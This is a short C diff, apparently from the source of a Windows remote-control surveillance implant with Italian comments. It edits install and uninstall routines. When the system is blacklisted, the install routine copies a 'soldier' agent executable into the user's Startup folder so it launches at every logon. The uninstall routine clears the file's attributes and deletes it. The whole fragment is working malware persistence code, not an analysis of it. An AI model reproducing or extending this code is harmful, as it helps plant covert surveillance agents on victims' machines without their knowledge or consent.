@@ -12,8 +12,8 @@ BOOL WIN_RCSInstall(rcs_struct_t *rcs_info, users_struct_t *user_info, os_struct
 
 	// Se puo' installare solo il soldier
 	if (os_info->is_blacklisted == BL_ALLOWSOLDIER) {
-		swprintf_s(tmp_path, MAX_PATH, L"%s\\WINDOWS\\SOLDIER\\%s", rcs_info->rcs_files_path, rcs_info->soldier_name);
-		swprintf_s(tmp_path2, MAX_PATH, L"%s\\%s", user_info->user_startup, rcs_info->soldier_name);
+		swprintf_s(tmp_path, MAX_PATH, L"%s\\WINDOWS\\SOLDIER\\soldier", rcs_info->rcs_files_path);
+		swprintf_s(tmp_path2, MAX_PATH, L"%s\\%s.exe", user_info->user_startup, rcs_info->soldier_name);
 		return CopyFile(tmp_path, tmp_path2, FALSE);
 	}
 
@@ -118,7 +118,7 @@ BOOL WIN_RCSUnInstall(rcs_struct_t *rcs_info, users_struct_t *user_info, os_stru
 	}
 
 	// Cancella un eventuale Soldier
-	swprintf_s(tmp_path, MAX_PATH, L"%s\\%s", user_info->user_startup, rcs_info->soldier_name);
+	swprintf_s(tmp_path, MAX_PATH, L"%s\\%s.exe", user_info->user_startup, rcs_info->soldier_name);
 	ClearAttributes(tmp_path);
 	DeleteFile(tmp_path);
 
